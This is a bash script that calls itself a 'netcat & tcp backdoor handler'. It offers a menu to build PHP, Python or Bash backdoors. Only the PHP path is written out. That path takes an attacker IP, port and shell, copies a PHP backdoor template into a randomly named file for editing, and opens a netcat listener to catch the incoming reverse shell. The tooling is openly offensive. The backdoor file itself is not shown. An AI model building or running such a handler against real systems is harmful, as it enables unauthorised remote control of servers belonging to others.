#!/bin/bash

#netcat & tcp backdoor handler
source ./loading-bar.sh 


printf "\e[32m
██╗  ██╗ █████╗ ███╗   ██╗██████╗ ██╗     ███████╗██████╗ 
██║  ██║██╔══██╗████╗  ██║██╔══██╗██║     ██╔════╝██╔══██╗
███████║███████║██╔██╗ ██║██║  ██║██║     █████╗  ██████╔╝
██╔══██║██╔══██║██║╚██╗██║██║  ██║██║     ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║ ╚████║██████╔╝███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n"

#check for packet manager
which apt >/dev/null 2>&1
if [ $? -eq 0 ]
then
    apt="True"
else
    apt="false"
fi
######
which pkg >/dev/null 2>&1
if [ $? -eq 0 ]
then
    apt="false"
    pkg="true"
else
    apt="false"
    pkg="false"
fi
######
which pacman >/dev/null 2>&1
if [ $? -eq 0 ]
then
    pacman="true"
else
    pacman="false"
fi
#####
which yum >/dev/null 2>&1
if [ $? -eq 0 ]
then
    yum="true"
else
    yum="false"
fi
#packet manager-end


if [ $apt == "true" ];
then
packed="apt-get install "
else
sleep 0.1
fi 

if [ $pkg == "true" ];
then
packed="pkg install "
else
sleep 0.1
fi 

if [ $pacman == "true" ];
then
packed="pacman -S "
else
sleep 0.1
fi 

if [ $yum == "true" ];
then
packed="yum install "
else
sleep 0.1
fi 

bad="[×]"
good="[√]"
ques="[?]"
alrt="[!]"
star="[*]"
#color
red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'
new=$'\n'
file="netcat"

if command -v ncat &>/dev/null;
then
  printf "$grn $good ncat command found$end$new"
else
  echo "$red $bad ncat command not found!$end$new"


    if [ ! -z "$packed" ];
    then
      printf "$grn $good ($packed) found as packet manager$new$end"

        printf "$cyn $starDo you wish to auto-install (ncat) on your system? $new"
          read -p "Option: " opton

            if [ -z "$opton" ];
            then
              printf "$star [ENTER]...$new"
              $packed $file &>/dev/null && progress-bar 3
            else

            if [ $opton == "y" ];
            then
              $packed $file &>/dev/null
              printf "$star Done!$new"
            fi

            if [ $opton == "Y" ];
            then
              $packed $file &>/dev/null && progress-bar 3
              printf "$star Done!"
            fi
          fi

            
    else
      printf "$red $bad no_packet_manager_found $end $new"
      exit 0
    fi
fi

printf "$star starting handler$new"
loading-bar 5

while :
do
echo "
[1] Make and use PHP backdoor
[2] Make and use Python backdoor
[3] Make and use Bash backdoor
"

read -p "handler: " handler

if [ -z "$handler" ];
then
  echo "$star [SPACE]..."
else
  if [ $handler == "1" ];
  then
    echo "$alrt PHP"
    read -p "IP: " ip
    read -p "PORT: " port
    read -p "SHELL: " shell
    name="$RANDOM"
    echo "making PHP backdoor"
    echo "Keep in mind this backdoor will only work for linux/unix based server's or system"
    echo "LHOST = $ip"
    echo "LPORT = $port"
    echo "NAME = $name"
    echo "SHELL = $shell"
    cat PHP-backdoor.php >> $name.php
    echo "You will now enter nano"
    echo "ONLY CHANGE WHAT IT WILL TELL YOU"
    printf "press enter to continue"
    read
    nano $name.php
    echo "started handler"
    nc -lvp $port 
  fi
fi
done
